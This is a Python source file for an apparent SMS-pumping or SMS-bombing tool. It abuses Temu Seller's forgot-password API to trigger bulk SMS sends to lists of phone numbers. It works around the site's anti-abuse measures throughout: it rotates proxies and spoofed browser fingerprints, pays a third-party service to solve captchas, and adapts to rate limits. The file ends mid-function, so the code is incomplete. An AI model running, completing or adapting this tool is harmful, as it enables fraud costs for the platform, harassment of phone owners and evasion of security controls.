"""
Temu Seller SMS Module v1.0

HTTP module for initiating SMS delivery via Temu Seller
forgot-password API endpoint.
Supports CSV and Number API input, proxy rotation with
country targeting, captcha solving (SadCaptcha),
rate limiting, and graceful shutdown.

Uses Temu Seller endpoints:
  POST /api/user/forget/sendCode
  GET  /api/captcha/get
  POST /api/captcha/verify

Usage:
    python temu_sms.py -i numbers.csv --threads 5 -p "user:pass@host:port"
    python temu_sms.py --api --claim-count 10 --threads 5
    python temu_sms.py -i numbers.csv --threads 10 --region eu
"""

import asyncio
import aiohttp
import atexit
import json
import random
import time
import logging
import csv
import argparse
import sys
import os
import signal
import uuid
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from dataclasses import dataclass, replace, fields, field
from typing import (
    Optional, List, Any, Dict, Tuple,
)

if sys.platform == 'win32':
    asyncio.set_event_loop_policy(
        asyncio.WindowsSelectorEventLoopPolicy())

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s')
log = logging.getLogger('temu_sms')


# ============================================
#  CONSTANTS
# ============================================

RETRYABLE_HTTP_CODES = (429, 500, 502, 503, 504)
HTTP_TOO_MANY_REQUESTS = 429

MAX_CAPTCHA_ATTEMPTS = 3
MAX_EMPTY_CLAIMS = 3
MAX_PROXY_CONSECUTIVE_FAILS = 3
PROXY_BLACKLIST_BASE_SECONDS = 30
PROXY_BLACKLIST_CAP_SECONDS = 300

TEMU_ERROR_RATE_LIMIT = 1001
TEMU_ERROR_CAPTCHA = 2001
TEMU_ERROR_BLACKLIST = 3001

SEND_COOLDOWN_SECONDS = 60
REQUESTS_BEFORE_CAPTCHA = 4

ERR_HLR_FAILED = -1
ERR_MAX_RETRIES = -3
ERR_CAPTCHA_LOOP = -4
ERR_SHUTDOWN = -5
ERR_PROXY_EXHAUSTED = -7
ERR_CONFIG = -8
ERR_CRASH = -99

MASK_PREFIX_LEN = 2
MASK_SUFFIX_LEN = 2
MASK_SHORT_THRESHOLD = 6

TASK_BATCH_SIZE = 50
FSYNC_INTERVAL = 10

RATE_LIMIT_BACKOFF_FACTOR = 0.7
RATE_LIMIT_MIN_RPS = 0.5
RATE_LIMIT_RECOVERY_SECONDS = 60.0
RATE_LIMIT_RECOVERY_FACTOR = 1.1

HLR_FIELD_COUNTRY_CODE = 'country_code'
HLR_FIELD_COUNTRY_PREFIX = 'country_prefix'
HLR_FIELD_NATIONAL_NUMBER = 'national_number'
HLR_FIELD_COUNTRY_NAME = 'country_name'
HLR_FIELD_CARRIER = 'carrier'

TEMU_REGIONS: Tuple[str, ...] = (
    'eu', 'us', 'br', 'ca', 'au',
    'mx', 'cl', 'co', 'ar', 'pe',
    've', 'it', 'es', 'fr', 'de',
    'gb', 'nl', 'be', 'at', 'vn',
    'tr', 'in', 'pl', 'ru', 'ua',
)

COUNTRY_TO_TEMU_REGION: Dict[str, str] = {
    'US': 'us', 'CA': 'ca', 'MX': 'mx',
    'BR': 'br', 'AR': 'ar', 'CL': 'cl',
    'CO': 'co', 'PE': 'pe', 'VE': 've',
    'GB': 'gb', 'DE': 'de', 'FR': 'fr',
    'IT': 'it', 'ES': 'es', 'NL': 'nl',
    'BE': 'be', 'AT': 'at', 'PL': 'pl',
    'RU': 'ru', 'UA': 'ua', 'TR': 'tr',
    'IN': 'in', 'VN': 'vn', 'AU': 'au',
}

COUNTRY_TO_LANG: Dict[str, str] = {
    'US': 'en', 'CA': 'en', 'GB': 'en',
    'AU': 'en', 'IN': 'en',
    'DE': 'de', 'AT': 'de',
    'FR': 'fr', 'BE': 'fr',
    'IT': 'it', 'ES': 'es',
    'MX': 'es', 'AR': 'es', 'CL': 'es',
    'CO': 'es', 'PE': 'es', 'VE': 'es',
    'BR': 'pt', 'NL': 'nl',
    'PL': 'pl', 'RU': 'ru', 'UA': 'uk',
    'TR': 'tr', 'VN': 'vi',
}

USER_AGENTS: Tuple[str, ...] = (
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
    'AppleWebKit/537.36 (KHTML, like Gecko) '
    'Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
    'AppleWebKit/537.36 (KHTML, like Gecko) '
    'Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
    'AppleWebKit/537.36 (KHTML, like Gecko) '
    'Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) '
    'Gecko/20100101 Firefox/134.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
    'AppleWebKit/605.1.15 (KHTML, like Gecko) '
    'Version/18.3 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
    'AppleWebKit/537.36 (KHTML, like Gecko) '
    'Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) '
    'AppleWebKit/537.36 (KHTML, like Gecko) '
    'Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) '
    'Gecko/20100101 Firefox/133.0',
)

CAPTCHA_TIMEOUTS: Dict[str, int] = {
    'recaptcha_v3': 30,
    'slide': 20,
    'puzzle': 20,
    'rotate': 25,
}
CAPTCHA_TIMEOUT_DEFAULT = 30


# ============================================
#  FILE I/O EXECUTOR
# ============================================

_io_executor = ThreadPoolExecutor(
    max_workers=2, thread_name_prefix='file_io')

atexit.register(
    lambda: _io_executor.shutdown(wait=False))


async def run_in_io(func, *args):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(
        _io_executor, func, *args)


# ============================================
#  PII MASKING
# ============================================

def mask_phone(phone: str) -> str:
    if not phone:
        return '***'
    clean = phone.strip()
    if len(clean) <= MASK_SHORT_THRESHOLD:
        return (
            clean[:MASK_PREFIX_LEN] + '***')
    prefix = clean[:MASK_PREFIX_LEN]
    suffix = clean[-MASK_SUFFIX_LEN:]
    mid = (
        len(clean)
        - MASK_PREFIX_LEN
        - MASK_SUFFIX_LEN)
    return prefix + '*' * mid + suffix


# ============================================
#  EXCEPTIONS
# ============================================

class AppError(Exception):
    """Base application error."""


class NetworkError(AppError):
    def __init__(self, msg: str,
                 retryable: bool = True):
        super().__init__(msg)
        self.retryable = retryable


class CaptchaError(AppError):
    pass


class ProxyError(AppError):
    pass


class ShutdownError(AppError):
    pass


class ConfigError(AppError):
    pass


class HLRError(AppError):
    pass


# ============================================
#  SHUTDOWN
# ============================================

shutdown_event = asyncio.Event()


def _setup_signals():
    def _handler(sig, _):
        log.info('Signal %s, shutting down...', sig)
        shutdown_event.set()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            signal.signal(sig, _handler)
        except (OSError, ValueError):
            pass


def check_shutdown():
    if shutdown_event.is_set():
        raise ShutdownError('Shutdown requested')


# ============================================
#  UTILS
# ============================================

def strip_plus(phone: str) -> str:
    if phone.startswith('+'):
        return phone[1:]
    return phone


def safe_get(data: Any, *keys,
             default=None) -> Any:
    current = data
    for key in keys:
        if current is None:
            return default
        if isinstance(current, dict):
            current = current.get(key, default)
        elif (isinstance(current, (list, tuple))
              and isinstance(key, int)):
            try:
                current = current[key]
            except (IndexError, TypeError):
                return default
        else:
            return default
    return current


def jitter_delay(attempt: int,
                 base: float = 1.0,
                 cap: float = 30.0) -> float:
    return random.uniform(
        0, min(base * (2 ** attempt), cap))


def generate_device_id() -> str:
    return str(uuid.uuid4())


def get_temu_region(
        country_code: str) -> str:
    return COUNTRY_TO_TEMU_REGION.get(
        country_code.upper(), 'eu')


def get_lang(country_code: str) -> str:
    return COUNTRY_TO_LANG.get(
        country_code.upper(), 'en')


def build_seller_url(
        region: str, path: str) -> str:
    return (
        'https://seller-'
        + region.lower()
        + '.temu.com'
        + path)


# ============================================
#  RATE LIMITER
# ============================================

class RateLimiter:
    def __init__(self, rate: float = 3.0,
                 burst: int = 6):
        self._rate = rate
        self._initial_rate = rate
        self._burst = burst
        self._tokens = float(burst)
        self._last_refill = time.monotonic()
        self._last_slowdown = 0.0
        self._lock = asyncio.Lock()

    async def acquire(self,
                      tokens: int = 1) -> None:
        while True:
            check_shutdown()
            async with self._lock:
                now = time.monotonic()
                elapsed = now - self._last_refill
                self._tokens = min(
                    self._burst,
                    self._tokens
                    + elapsed * self._rate)
                self._last_refill = now
                if (self._rate
                        < self._initial_rate
                        and self._last_slowdown > 0
                        and (now
                             - self._last_slowdown)
                        > RATE_LIMIT_RECOVERY_SECONDS
                ):
                    self._rate = min(
                        self._initial_rate,
                        self._rate
                        * RATE_LIMIT_RECOVERY_FACTOR)
                    log.info(
                        'Rate recovering -> %.1f req/s',
                        self._rate)
                if self._tokens >= tokens:
                    self._tokens -= tokens
                    return
                wait = (
                    (tokens - self._tokens)
                    / self._rate)
            await asyncio.sleep(min(wait, 1.0))

    async def slow_down(self) -> None:
        async with self._lock:
            new_rate = max(
                RATE_LIMIT_MIN_RPS,
                self._rate
                * RATE_LIMIT_BACKOFF_FACTOR)
            if new_rate != self._rate:
                self._rate = new_rate
                self._last_slowdown = (
                    time.monotonic())
                log.info(
                    'Rate limiter -> %.1f req/s',
                    self._rate)


# ============================================
#  PROXY MANAGER
# ============================================

class ProxyManager:

    @dataclass
    class _Entry:
        host: str
        port: str
        user: str
        password: str
        fail_count: int = 0
        last_fail: float = 0.0
        blacklisted_until: float = 0.0
        total_requests: int = 0
        total_errors: int = 0

        def is_available(self) -> bool:
            return (
                self.blacklisted_until <= 0
                or time.time()
                > self.blacklisted_until)

        def record_success(self) -> None:
            self.total_requests += 1
            self.fail_count = 0

        def record_failure(self) -> None:
            self.total_requests += 1
            self.total_errors += 1
            self.fail_count += 1
            self.last_fail = time.time()
            if (self.fail_count
                    >= MAX_PROXY_CONSECUTIVE_FAILS):
                duration = min(
                    PROXY_BLACKLIST_BASE_SECONDS
                    * (2 ** (
                        self.fail_count
                        - MAX_PROXY_CONSECUTIVE_FAILS
                    )),
                    PROXY_BLACKLIST_CAP_SECONDS)
                self.blacklisted_until = (
                    time.time() + duration)
                log.warning(
                    'Proxy %s:%s blacklisted %ds',
                    self.host, self.port,
                    duration)

    def __init__(self,
                 proxies: Optional[List[str]]
                 = None):
        self._entries: List[
            ProxyManager._Entry] = []
        self._lock = asyncio.Lock()
        self._index = 0
        if proxies:
            for proxy_str in proxies:
                entry = self._parse(proxy_str)
                if entry:
                    self._entries.append(entry)
            log.info(
                'Proxy pool: %d loaded',
                len(self._entries))

    @staticmethod
    def _parse(
            proxy: str
    ) -> Optional['ProxyManager._Entry']:
        clean = proxy.strip()
        for pfx in (
                'http://', 'https://',
                'socks5://'):
            if clean.startswith(pfx):
                clean = clean[len(pfx):]
        host = port = user = password = ''

        if '@' in clean:
            auth, server = clean.rsplit('@', 1)
            sp = server.split(':')
            if len(sp) != 2:
                return None
            host, port = sp
            ap = auth.split(':', 1)
            user = ap[0]
            password = ap[1] if len(ap) > 1 else ''
        else:
            parts = clean.split(':', 3)
            if len(parts) == 2:
                host, port = parts
            elif len(parts) >= 4:
                host = parts[0]
                port = parts[1]
                user = parts[2]
                password = parts[3]
            else:
                return None

        if not host or not port:
            return None

        return ProxyManager._Entry(
            host=host, port=port,
            user=user, password=password)

    async def get(
            self,
            country_code: Optional[str] = None
    ) -> Optional[str]:
        if not self._entries:
            return None
        wait = 0.0
        async with self._lock:
            for _ in range(len(self._entries)):
                entry = self._entries[
                    self._index
                    % len(self._entries)]
                self._index += 1
                if entry.is_available():
                    return self._build_url(
                        entry, country_code)
            best = min(
                self._entries,
                key=lambda e:
                e.blacklisted_until)
            wait = max(
                0.0,
                best.blacklisted_until
                - time.time())
            if wait > 0:
                log.warning(
                    'All proxies blacklisted,'
                    ' waiting %.1fs', wait)
        if wait > 0:
            await asyncio.sleep(
                min(wait, 10.0))
        async with self._lock:
            best = min(
                self._entries,
                key=lambda e:
                e.blacklisted_until)
            best.blacklisted_until = 0
            best.fail_count = 0
            return self._build_url(
                best, country_code)

    @staticmethod
    def _build_url(
            entry: '_Entry',
            country_code: Optional[str]
    ) -> str:
        password = entry.password
        if country_code:
            cc = country_code.upper()
            if 'COUNTRY_CODE' in password:
                password = password.replace(
                    'COUNTRY_CODE', cc)
            elif 'country-' not in password:
                password = (
                    password
                    + '_country-'
                    + cc
                    + '_streaming-1')
        if entry.user:
            encoded_user = quote(
                entry.user, safe='')
            encoded_pass = quote(
                password, safe='')
            return (
                'http://'
                + encoded_user + ':'
                + encoded_pass
                + '@' + entry.host
                + ':' + entry.port)
        return (
            'http://' + entry.host
            + ':' + entry.port)

    async def report_success(
            self,
            proxy_url: Optional[str]) -> None:
        if not proxy_url or not self._entries:
            return
        async with self._lock:
            for entry in self._entries:
                if entry.host in proxy_url:
                    entry.record_success()
                    return

    async def report_failure(
            self,
            proxy_url: Optional[str]) -> None:
        if not proxy_url or not self._entries:
            return
        async with self._lock:
            for entry in self._entries:
                if entry.host in proxy_url:
                    entry.record_failure()
                    return


# ============================================
#  CONFIG
# ============================================

@dataclass
class AppConfig:
    sadcaptcha_key: str = ''
    hlr_api_key: str = ''
    hlr_api_url: str = (
        'https://hlrdeep.com/api/public'
        '/v1/hlr/check')
    number_api_base: str = ''
    number_api_key: str = ''
    claim_count: int = 10
    lease_seconds: int = 600
    max_retries: int = 3
    request_timeout: int = 15
    delay_min: float = 1.0
    delay_max: float = 3.0
    cooldown_seconds: float = 60.0
    requests_before_captcha: int = 4
    global_rps: float = 3.0
    global_burst: int = 6
    default_region: str = 'eu'
    rotate_ua: bool = True
    use_device_id: bool = True

    def __hash__(self):
        return hash(self.default_region)

    def __eq__(self, other):
        if not isinstance(other, AppConfig):
            return NotImplemented
        return (self.default_region
                == other.default_region)

    def validate(self, mode: str = 'csv') -> None:
        missing = []
        if not self.hlr_api_key:
            missing.append('hlr_api_key')
        if mode == 'api':
            if not self.number_api_base:
                missing.append('number_api_base')
            if not self.number_api_key:
                missing.append('number_api_key')
        if missing:
            raise ConfigError(
                'Missing: ' + ', '.join(missing))
        if not self.sadcaptcha_key:
            log.warning(
                'No sadcaptcha_key configured.'
                ' Captcha challenges will cause'
                ' failures after %d requests.'
                ' This may reduce success rate.',
                self.requests_before_captcha)

    def with_overrides(
            self, **kwargs) -> 'AppConfig':
        return replace(self, **kwargs)


def load_config(
        path: str = 'config.json') -> AppConfig:
    overrides: Dict[str, Any] = {}
    valid_keys = {
        f.name for f in fields(AppConfig)}
    if os.path.exists(path):
        try:
            with open(path, 'r') as f:
                raw = json.load(f)
            for key, val in raw.items():
                if key in valid_keys:
                    overrides[key] = val
            log.info('Config: %s', path)
        except (json.JSONDecodeError,
                IOError) as exc:
            log.warning(
                'Config error (%s): %s',
                path, exc)
    env_map = {
        'SADCAPTCHA_KEY': 'sadcaptcha_key',
        'HLR_API_KEY': 'hlr_api_key',
        'HLR_API_URL': 'hlr_api_url',
        'NUMBER_API_BASE': 'number_api_base',
        'NUMBER_API_KEY': 'number_api_key',
    }
    for env_key, conf_key in env_map.items():
        val = os.environ.get(env_key)
        if val:
            overrides[conf_key] = val
    return AppConfig(**overrides)


# ============================================
#  HLR RESPONSE MODEL
# ============================================

@dataclass
class HLRResult:
    country_code: str = 'US'
    country_prefix: str = ''
    national_number: str = ''
    country_name: str = ''
    carrier: str = ''

    @classmethod
    def from_api(
            cls, info: dict,
            fallback_number: str = ''
    ) -> 'HLRResult':
        return cls(
            country_code=info.get(
                HLR_FIELD_COUNTRY_CODE,
                'US'),
            country_prefix=strip_plus(
                info.get(
                    HLR_FIELD_COUNTRY_PREFIX,
                    '')),
            national_number=info.get(
                HLR_FIELD_NATIONAL_NUMBER,
                fallback_number),
            country_name=info.get(
                HLR_FIELD_COUNTRY_NAME, ''),
            carrier=info.get(
                HLR_FIELD_CARRIER, ''),
        )


# ============================================
#  NUMBER API
# ============================================

class NumberAPI:

    def __init__(self, config: AppConfig):
        self.base_url = (
            config.number_api_base.rstrip('/'))
        self._headers = {
            'X-API-Key': config.number_api_key,
            'Content-Type': 'application/json',
        }

    async def _post(
            self,
            session: aiohttp.ClientSession,
            endpoint: str,
            payload: dict) -> Optional[dict]:
        url = self.base_url + endpoint
        for attempt in range(3):
            check_shutdown()
            try:
                async with session.post(
                    url, headers=self._headers,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(
                        total=15)
                ) as resp:
                    if resp.status == 200:
                        return await resp.json()
                    if resp.status in (
                            400, 401, 409):
                        text = await resp.text()
                        log.error(
                            'NumberAPI %d: %s',
                            resp.status,
                            text[:200])
                        return None
                    if resp.status in (
                            RETRYABLE_HTTP_CODES):
                        await asyncio.sleep(
                            jitter_delay(attempt))
                        continue
                    text = await resp.text()
                    log.error(
                        'NumberAPI %d: %s',
                        resp.status,
                        text[:200])
                    return None
            except (
                asyncio.TimeoutError,
                aiohttp.ServerTimeoutError
            ):
                await asyncio.sleep(
                    jitter_delay(attempt, 0.5))
            except aiohttp.ClientError as exc:
                raise NetworkError(
                    'NumberAPI: ' + str(exc))
            except ShutdownError:
                raise
            except Exception as exc:
                raise NetworkError(
                    'NumberAPI: ' + str(exc))
        return None

    async def claim(
            self,
            session: aiohttp.ClientSession,
            count: int = 10,
            lease_seconds: int = 600
    ) -> Optional[dict]:
        data = await self._post(
            session, '/v1/numbers/claim', {
                'count': max(
                    1, min(count, 500)),
                'leaseSeconds': max(
                    30, min(
                        lease_seconds, 86400)),
            })
        if data:
            items = data.get('items', [])
            claim_id = data.get('claimId', '?')
            log.info(
                'Claimed %d (claim=%s)',
                len(items), claim_id)
        return data

    async def report(
            self,
            session: aiohttp.ClientSession,
            claim_id: str,
            results: List[dict]
    ) -> Optional[dict]:
        if not results:
            return {'updated': 0, 'ignored': 0}
        data = await self._post(
            session, '/v1/numbers/report', {
                'claimId': claim_id,
                'results': results[:500],
            })
        if data:
            log.info(
                'Report: updated=%d',
                data.get('updated', 0))
        return data


# ============================================
#  HLR
# ============================================

class HLRLookup:

    def __init__(self, config: AppConfig):
        self.api_key = config.hlr_api_key
        self.api_url = config.hlr_api_url

    async def lookup(
            self,
            session: aiohttp.ClientSession,
            phone: str) -> Optional[HLRResult]:
        masked = mask_phone(phone)
        phone_clean = strip_plus(phone)
        for attempt in range(3):
            check_shutdown()
            try:
                async with session.get(
                    self.api_url,
                    params={
                        'phoneNumber':
                            phone_clean},
                    headers={
                        'X-API-Key':
                            self.api_key},
                    timeout=(
                        aiohttp.ClientTimeout(
                            total=10))
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data.get('success'):
                            info = (
                                data.get('data')
                                or {})
                            return (
                                HLRResult.from_api(
                                    info,
                                    phone_clean))
                        return None
                    if resp.status in (
                            RETRYABLE_HTTP_CODES):
                        await asyncio.sleep(
                            jitter_delay(attempt))
                        continue
                    return None
            except (
                asyncio.TimeoutError,
                aiohttp.ServerTimeoutError
            ):
                await asyncio.sleep(
                    jitter_delay(attempt, 0.5))
            except aiohttp.ClientError as exc:
                raise NetworkError(
                    'HLR ' + masked
                    + ': ' + str(exc))
            except ShutdownError:
                raise
            except Exception as exc:
                raise NetworkError(
                    'HLR ' + masked
                    + ': ' + str(exc))
        return None


# ============================================
#  CAPTCHA SOLVER (SadCaptcha)
# ============================================

class CaptchaSolver:
    BASE_URL = (
        'https://www.sadcaptcha.com/api/v1')

    def __init__(self, config: AppConfig):
        self.api_key = config.sadcaptcha_key
        self._balance: int = -1

    @property
    def has_key(self) -> bool:
        return bool(self.api_key)

    async def check_balance(
            self,
            session: aiohttp.ClientSession
    ) -> int:
        if not self.api_key:
            log.info(
                'No captcha key, skipping'
                ' balance check')
            return -1
        try:
            async with session.get(
                self.BASE_URL
                + '/license/credits',
                params={
                    'licenseKey': self.api_key},
                timeout=aiohttp.ClientTimeout(
                    total=10)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    self._balance = data.get(
                        'credits', 0)
                    log.info(
                        'Captcha balance: %d',
                        self._balance)
                    return self._balance
                return -1
        except Exception as exc:
            log.warning(
                'Captcha balance: %s', exc)
            return -1

    async def solve(
            self, subtype: str,
            session: aiohttp.ClientSession,
            phone: str = '',
            **kwargs) -> Optional[dict]:
        if self._balance == 0:
            raise CaptchaError('Balance 0')
        if not self.api_key:
            raise CaptchaError(
                'No captcha key configured')
        ep_map = {
            'recaptcha_v3': '/recaptcha-v3',
            'slide': '/puzzle',
            'puzzle': '/puzzle',
            'rotate': '/rotate',
        }
        endpoint = ep_map.get(subtype)
        if not endpoint:
            raise CaptchaError(
                'Unknown subtype: ' + subtype)
        pl_map = {
            '/recaptcha-v3': {
                'siteKey': kwargs.get(
                    'site_key', ''),
                'pageUrl': kwargs.get(
                    'page_url', ''),
            },
            '/puzzle': {
                'puzzleImageB64': kwargs.get(
                    'puzzle_b64', ''),
                'pieceImageB64': kwargs.get(
                    'piece_b64', ''),
            },
            '/rotate': {
                'outerImageB64': kwargs.get(
                    'outer_b64', ''),
                'innerImageB64': kwargs.get(
                    'inner_b64', ''),
            },
        }
        timeout = CAPTCHA_TIMEOUTS.get(
            subtype, CAPTCHA_TIMEOUT_DEFAULT)
        masked = mask_phone(phone)
        for attempt in range(3):
            try:
                async with session.post(
                    self.BASE_URL + endpoint,
                    params={
                        'licenseKey':
                            self.api_key},
                    json=pl_map[endpoint],
                    timeout=(
                        aiohttp.ClientTimeout(
                            total=timeout))
                ) as resp:
                    if resp.status == 200:
                        result = (
                            await resp.json())
                        log.info(
                            '[%s] Captcha solved'
                            ' (%s)',
                            masked, subtype)
                        return result
                    if resp.status in (
                            RETRYABLE_HTTP_CODES):
                        await asyncio.sleep(
                            jitter_delay(attempt))
                        continue
                    text = await resp.text()
                    raise CaptchaError(
                        str(resp.status) + ': '
                        + text[:150])
            except (
                asyncio.TimeoutError,
                aiohttp.ServerTimeoutError
            ):
                await asyncio.sleep(
                    jitter_delay(attempt, 0.5))
            except aiohttp.ClientError as exc:
                raise NetworkError(
                    'Captcha: ' + str(exc))
            except (
                ShutdownError, CaptchaError
            ):
                raise
            except Exception as exc:
                raise CaptchaError(
                    type(exc).__name__ + ': '
                    + str(exc))
        raise CaptchaError('Max retries')


# ============================================
#  FINGERPRINT
# ============================================

@dataclass
class Fingerprint:
    device_id: str = ''
    user_agent: str = ''
    region: str = 'eu'
    lang: str = 'en'
    country_code: str = 'US'
    request_count: int = 0

    @classmethod
    def generate(
            cls,
            country_code: str,
            config: AppConfig
    ) -> 'Fingerprint':
        region = get_temu_region(country_code)
        lang = get_lang(country_code)
        ua = random.choice(USER_AGENTS)
        did = (
            generate_device_id()
            if config.use_device_id
            else '')
        return cls(
            device_id=did,
            user_agent=ua,
            region=region,
            lang=lang,
            country_code=country_code,
        )

    def needs_rotation(
            self,
            max_requests: int) -> bool:
        return self.request_count >= max_requests

    def record_use(self) -> None:
        self.request_count += 1

    def build_headers(self) -> Dict[str, str]:
        region = self.region.lower()
        base_url = (
            'https://seller-'
            + region + '.temu.com')
        return {
            'User-Agent': self.user_agent,
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Referer': base_url + '/login.html',
            'Origin': base_url,
            'Accept-Language': (
                self.lang + ','
                + self.lang + ';q=0.9,'
                'en;q=0.8'),
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
        }


# ============================================
#  TEMU SMS ENGINE
# ============================================

class TemuSMS:

    def __init__(
            self, config: AppConfig,
            connector: aiohttp.TCPConnector,
            proxy_mgr: ProxyManager,
            captcha: CaptchaSolver,
            hlr: HLRLookup,
            limiter: RateLimiter):
        self.config = config
        self._connector = connector
        self.proxy = proxy_mgr
        self.captcha = captcha
        self.hlr = hlr
        self.limiter = limiter
        self.fingerprint: Optional[
            Fingerprint] = None
        self._session: Optional[
            aiohttp.ClientSession] = None

    async def __aenter__(self) -> 'TemuSMS':
        return self

    async def __aexit__(self, *exc) -> None:
        await self.close()

    async def _get_session(
            self) -> aiohttp.ClientSession:
        if (self._session is None
                or self._session.closed):
            self._session = (
                aiohttp.ClientSession(
                    connector=self._connector,
                    connector_owner=False))
        return self._session

    async def close(self) -> None:
        if (self._session
                and not self._session.closed):
            await self._session.close()
            self._session = None

    def _generate_fingerprint(
            self,
            country_code: str) -> None:
        self.fingerprint = (
            Fingerprint.generate(
                country_code, self.config))
        log.info(
            'Fingerprint: region=%s,'
            ' lang=%s, did=%s',
            self.fingerprint.region,
            self.fingerprint.lang,
            self.fingerprint.device_id[:8]
            + '...'
            if self.fingerprint.device_id
            else 'none')

    def _rotate_fingerprint(
            self,
            country_code: str) -> None:
        self._generate_fingerprint(
            country_code)

    async def _request_json(
            self, method: str, url: str,
            json_body: Optional[dict] = None,
            params: Optional[dict] = None,
            proxy_url: Optional[str] = None,
            phone: str = ''
    ) -> Optional[dict]:
        masked = mask_phone(phone)
        await self.limiter.acquire()
        check_shutdown()
        session = await self._get_session()
        headers = (
            self.fingerprint.build_headers())
        for attempt in range(
                self.config.max_retries):
            check_shutdown()
            try:
                kw: Dict[str, Any] = {
                    'headers': headers,
                    'timeout': (
                        aiohttp.ClientTimeout(
                            total=(
                                self.config
                                .request_timeout
                            ))),
                }
                if proxy_url:
                    kw['proxy'] = proxy_url
                if json_body is not None:
                    kw['json'] = json_body
                if params is not None:
                    kw['params'] = params
                fn = (
                    session.post
                    if method == 'POST'
                    else session.get)
                async with fn(url, **kw) as resp:
                    if resp.status in (
                            RETRYABLE_HTTP_CODES):
                        wait = jitter_delay(
                            attempt)
                        log.warning(
                            '[%s] HTTP %d,'
                            ' retry %.1fs',
                            masked, resp.status,
                            wait)
                        if resp.status == (
                                HTTP_TOO_MANY_REQUESTS
                        ):
                            await (
                                self.limiter
                                .slow_down())
                        await asyncio.sleep(wait)
                        continue
                    await (
                        self.proxy
                        .report_success(
                            proxy_url))
                    return (
                        await resp.json(
                            content_type=None))
            except (
                asyncio.TimeoutError,
                aiohttp.ServerTimeoutError
            ):
                await (
                    self.proxy.report_failure(
                        proxy_url))
                await asyncio.sleep(
                    jitter_delay(attempt, 0.5))
            except (
                aiohttp
                .ClientProxyConnectionError
            ):
                await (
                    self.proxy.report_failure(
                        proxy_url))
                new = await self.proxy.get(
                    self.fingerprint.country_code
                    if self.fingerprint
                    else None)
                if new and new != proxy_url:
                    proxy_url = new
                await asyncio.sleep(
                    jitter_delay(attempt, 0.5))
            except aiohttp.ClientError as exc:
                await (
                    self.proxy.report_failure(
                        proxy_url))
                raise NetworkError(
                    type(exc).__name__ + ': '
                    + str(exc))
            except ShutdownError:
                raise
            except Exception as exc:
                raise NetworkError(
                    type(exc).__name__ + ': '
                    + str(exc))
        raise NetworkError(
            'Max retries exhausted',
            retryable=False)

    async def _handle_captcha(
            self,
            proxy_url: Optional[str] = None,
            phone: str = '') -> bool:
        masked = mask_phone(phone)
        if not self.captcha.has_key:
            log.warning(
                '[%s] Captcha required but'
                ' no solver key', masked)
            return False
        region = self.fingerprint.region
        get_url = build_seller_url(
            region, '/api/captcha/get')
        try:
            challenge = (
                await self._request_json(
                    'GET', get_url,
                    params={
                        'type': 'recaptcha_v3',
                        'scene': 'forget_pwd',
                        'token': '',
                    },
                    proxy_url=proxy_url,
                    phone=phone))
        except NetworkError:
            return False
        if (not challenge
                or not isinstance(
                    challenge, dict)):
            raise CaptchaError(
                'Challenge response empty')
        cd = challenge.get('data', challenge)
        if not isinstance(cd, dict):
            raise CaptchaError(
                'Challenge data invalid')
        captcha_type = cd.get(
            'type', 'recaptcha_v3')
        session = await self._get_session()
        solution: Optional[dict] = None
        if captcha_type in (
                'recaptcha_v3', 'recaptcha'):
            page_url = build_seller_url(
                region, '/login.html')
            site_key = cd.get(
                'gt', cd.get('siteKey', ''))
            solution = await self.captcha.solve(
                'recaptcha_v3', session,
                phone=phone,
                site_key=site_key,
                page_url=page_url)
        elif captcha_type == 'slide':
            puzzle = cd.get('puzzle', {})
            url1 = puzzle.get('url1', '')
            url2 = puzzle.get('url2', '')
            if url1 and url2:
                p_b64 = await self._fetch_b64(
                    url1)
                pc_b64 = await self._fetch_b64(
                    url2)
                if p_b64 and pc_b64:
                    solution = (
                        await self.captcha
                        .solve(
                            'slide', session,
                            phone=phone,
                            puzzle_b64=p_b64,
                            piece_b64=pc_b64))
        elif captcha_type == 'rotate':
            puzzle = cd.get('puzzle', {})
            url1 = puzzle.get('url1', '')
            url2 = puzzle.get('url2', '')
            if url1 and url2:
                o_b64 = await self._fetch_b64(
                    url1)
                i_b64 = await self._fetch_b64(
                    url2)
                if o_b64 and i_b64:
                    solution = (
                        await self.captcha
                        .solve(
                            'rotate', session,
                            phone=phone,
                            outer_b64=o_b64,
                            inner_b64=i_b64))
        else:
            raise CaptchaError(
                'Unknown captcha type: '
                + captcha_type)
        if not solution:
            raise CaptchaError(
                'Solver returned empty')
        verify_url = build_seller_url(
            region, '/api/captcha/verify')
        vr = await self._request_json(
            'POST', verify_url,
            json_body={
                'solution': solution},
            proxy_url=proxy_url,
            phone=phone)
        if (not vr
                or not isinstance(vr, dict)):
            raise CaptchaError(
                'Verify response empty')
        if (vr.get('success')
                or vr.get('code') == 0
                or 'success' in (
                    str(vr).lower())):
            log.info(
                '[%s] Captcha verified',
                masked)
            return True
        raise CaptchaError(
            'Verify failed: '
            + str(vr.get('msg',
                         vr.get('message',
                                '?')))[:100])

    async def _fetch_b64(
            self, url: str) -> str:
        if not url:
            return ''
        session = await self._get_session()
        try:
            import base64
            async with session.get(
                url,
                timeout=aiohttp.ClientTimeout(
                    total=10)
            ) as resp:
                if resp.status == 200:
                    return base64.b64encode(
                        await resp.read()
                    ).decode()
        except Exception:
            pass
        return ''

    async def _setup_for_send(
